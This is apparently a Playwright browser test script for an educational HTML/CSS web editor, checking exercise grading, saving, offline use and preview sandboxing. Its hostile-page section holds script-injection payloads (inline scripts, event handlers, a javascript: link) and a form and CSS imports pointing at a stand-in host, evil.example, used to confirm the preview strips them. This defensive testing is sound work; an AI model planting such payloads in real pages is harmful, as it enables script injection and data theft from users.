/* eslint-disable @typescript-eslint/no-require-imports */
// Browser tests for Rhinox Web Studio (HTML and CSS).
//   npm run build && npm run start ; node scripts/web-browser-tests.cjs http://localhost:3000
// For every exercise it types a correct solution and checks that it passes, and checks that the untouched
// starter does not. It also tries hostile pages (scripts, event handlers, outside pictures, forms, redirects).
const { chromium } = require("playwright");

const BASE = (process.argv[2] || "http://localhost:3000").replace(/\/$/, "");
const URL = BASE + "/coding-robotics/code-studio/web";
const results = [];
function check(name, ok, detail = "") {
  results.push({ name, ok });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  (" + detail + ")" : ""}`);
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const page0 = (body) => `<!DOCTYPE html><html><head><title>t</title></head><body>${body}</body></html>`;

const SOLUTIONS = {
  "web-heading": { html: page0("<h1>My page</h1><p>Hello! My name is Ada.</p>"), css: "" },
  "web-list": { html: page0("<h2>Things</h2><ul><li>Rhinos</li><li>Robots</li><li>Rockets</li></ul>"), css: "" },
  "web-link": { html: page0('<a href="https://rhinoxscientifica.com">Rhinox Scientifica</a>'), css: "" },
  "web-colour": { html: page0("<h1>Colour me in</h1><p>Dark grey text.</p>"), css: "h1{color:red} p{color:#333} body{background-color:#f5f5f5}" },
  "web-card": { html: page0('<div class="card"><h2>Rhino</h2><p>Fact</p></div>'), css: ".card{background-color:#e5eefb;padding:20px;border-radius:12px;max-width:400px}" },
  "web-center": { html: page0('<h1>Centred</h1><div class="box">Middle</div>'), css: "h1{text-align:center} .box{width:300px;padding:12px;margin:0 auto;background:#cfe2ff}" },
  "web-flex": { html: page0('<div class="row"><div class="item">1</div><div class="item">2</div><div class="item">3</div></div>'), css: ".row{display:flex;gap:12px} .item{padding:16px;background:#cfe2ff}" },
  "web-responsive": { html: page0('<div class="row"><div class="item">1</div><div class="item">2</div><div class="item">3</div></div>'), css: ".row{display:flex;gap:12px} .item{flex:1;padding:16px} @media (max-width:500px){.row{flex-direction:column}}" },
};

(async () => {
  const browser = await chromium.launch(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {});
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await context.newPage();
  const pageErrors = [];
    page.on("pageerror", (e) => pageErrors.push(e.message));
  // A request that the browser's policy stops is reported by Playwright too, then fails: only count the ones that went through.
  const pending = new Map();
  page.on("request", (r) => {
    if (!r.url().startsWith(BASE) && !/^(data|blob|about):/.test(r.url())) pending.set(r, r.url());
  });
  page.on("requestfailed", (r) => {
    if (/BLOCKED|CSP/i.test(r.failure()?.errorText || "")) pending.delete(r);
  });
  const dialogs = [];
  page.on("dialog", (d) => {
    dialogs.push(d.message());
    d.dismiss().catch(() => {});
  });

  const head = await fetch(URL);
  check("Web Studio page has a CSP", /default-src 'self'/.test(head.headers.get("content-security-policy") || ""));

  async function open() {
    await page.goto(URL, { waitUntil: "load" });
    await page.waitForSelector(".monaco-editor", { timeout: 30000 });
  }
  async function typeInto(code) {
    await page.click(".monaco-editor .view-lines");
    await page.keyboard.press("Control+A");
    await page.keyboard.insertText(code);
  }
  async function setFiles(html, css) {
    await page.getByRole("tab", { name: "index.html" }).click();
    await sleep(500);
    await typeInto(html);
    await page.getByRole("tab", { name: "style.css" }).click();
    await sleep(500);
    await typeInto(css || " ");
    await sleep(500);
  }
  const frame = () => page.frameLocator('iframe[title="Preview of your page"]');
  async function pick(value) {
    await page.selectOption('select[aria-label="Choose a free page or an exercise"]', value);
    await sleep(600);
  }
  async function waitFor(fn, ms = 6000) {
    const end = Date.now() + ms;
    while (Date.now() < end) {
      if (await fn()) return true;
      await sleep(100);
    }
    return false;
  }
  const verdict = async () => {
    const ok = await waitFor(async () => (await page.locator('[role="status"][data-passed]').count()) > 0, 15000);
    return ok ? await page.locator('[role="status"][data-passed]').getAttribute("data-passed") : "none";
  };

  await open();
  check("the free page shows a live preview", await waitFor(async () => /Hello, world!/.test(await frame().locator("body").innerText().catch(() => "")), 8000));
  await page.getByRole("tab", { name: "index.html" }).click();
  await sleep(400);
  await typeInto(page0("<h1>Typed live</h1>"));
  check("typing updates the preview", await waitFor(async () => /Typed live/.test(await frame().locator("body").innerText().catch(() => "")), 5000));

  // Exercises
  for (const [id, files] of Object.entries(SOLUTIONS)) {
    await pick("w:" + id);
    await page.getByRole("button", { name: "Check my work" }).click();
    check(`${id}: the untouched starter does not pass`, (await verdict()) === "0");
    await setFiles(files.html, files.css);
    await page.getByRole("button", { name: "Check my work" }).click();
    check(`${id}: a correct solution passes`, await waitFor(async () => (await page.locator('[role="status"][data-passed="1"]').count()) === 1, 15000));
  }
  check("finished exercises get a tick", (await page.locator("option", { hasText: "✓ " }).count()) === Object.keys(SOLUTIONS).length);

  // Hostile pages
  await pick("free");
  await page.getByRole("tab", { name: "index.html" }).click();
  await sleep(400);
  const hostile = page0(
    '<h1 id="x" onclick="alert(1)">Hostile</h1><script>alert("script")</script><img src="https://evil.example/pixel.png" onerror="alert(2)"><a href="javascript:alert(3)">js</a>' +
      '<form action="https://evil.example/steal"><input name="a"><button>go</button></form><iframe src="https://evil.example/"></iframe><meta http-equiv="refresh" content="0;url=https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">' +
      '<svg onload="alert(4)"><script>alert(5)</script></svg><object data="https://evil.example/o"></object>',
  );
  await typeInto(hostile);
  check("a hostile page still shows its safe parts", await waitFor(async () => /Hostile/.test(await frame().locator("body").innerText().catch(() => "")), 6000));
  await frame().locator("h1").click({ timeout: 3000 }).catch(() => {});
  await frame().locator("a").click({ timeout: 3000 }).catch(() => {});
  await sleep(800);
  check("no script, handler or javascript: link ran", dialogs.length === 0, dialogs.join("|"));
  check("the page says what was removed", /removed from the preview/.test(await page.locator("body").innerText()));
  const srcdoc = await page.locator('iframe[title="Preview of your page"]').getAttribute("srcdoc");
  check("the preview has the strict policy first and nothing external", /^<!doctype html>\s*<html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy"/i.test(srcdoc) && !/evil\.example|<script|onclick|onerror|onload/i.test(srcdoc));
  check("the preview iframe is fully sandboxed", (await page.locator('iframe[title="Preview of your page"]').getAttribute("sandbox")) === "");
  await typeInto(page0("<style>@import url(https://evil.example/a.css); h1{background:url(https://evil.example/bg.png)}</style><h1>css</h1>"));
  await sleep(800);
  const srcdoc2 = await page.locator('iframe[title="Preview of your page"]').getAttribute("srcdoc");
  check("outside CSS addresses are removed from the preview", !/evil\.example|@import/i.test(srcdoc2));

  // Save and reopen
  await pick("free");
  await typeInto(page0("<h1>Saved page</h1>"));
  await page.getByRole("button", { name: "Save to My Projects" }).click();
  check("a page can be saved to My Projects", await page.getByText(/Saved to My Projects/).first().waitFor({ timeout: 4000 }).then(() => true).catch(() => false));
  await page.goto(BASE + "/coding-robotics/my-projects", { waitUntil: "load" });
  check("My Projects lists it as a Web page", await page.getByText("Web page").first().waitFor({ timeout: 8000 }).then(() => true).catch(() => false));
  const link = page.locator('a[href*="/coding-robotics/code-studio/web?project="]').first();
  check("and links back to Web Studio", (await link.count()) === 1);
  await link.click();
  await page.waitForSelector(".monaco-editor", { timeout: 30000 });
  check("opening it brings the page back", await waitFor(async () => /Saved page/.test(await frame().locator("body").innerText().catch(() => "")), 6000));

  // Offline
  const offline = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const op = await offline.newPage();
  await op.goto(URL, { waitUntil: "load" });
  await op.waitForSelector(".monaco-editor", { timeout: 30000 });
  await op.getByRole("button", { name: "Save for offline use" }).click();
  check("Web Studio can be saved for offline use", await op.getByText(/Saved for offline use/).first().waitFor({ timeout: 60000 }).then(() => true).catch(() => false));
  await op.reload({ waitUntil: "load" });
  await sleep(1500);
  await offline.setOffline(true);
  await op.goto(URL, { waitUntil: "load" }).catch(() => {});
  check("the page opens with no internet and shows a preview", (await op.waitForSelector(".monaco-editor", { timeout: 30000 }).then(() => true).catch(() => false)) && /Hello, world!/.test(await op.frameLocator("iframe").locator("body").innerText().catch(() => "")));
  await offline.close();

  check("no files were fetched from other sites", pending.size === 0, [...pending.values()].join(", "));
  check("no uncaught errors on the page", pageErrors.length === 0, pageErrors.join(" | "));
  await browser.close();
  const failed = results.filter((r) => !r.ok).length;
  console.log(`\n${results.length - failed} of ${results.length} checks passed`);
  process.exit(failed ? 1 : 0);
})().catch((e) => {
  console.error(e);
  process.exit(2);
});
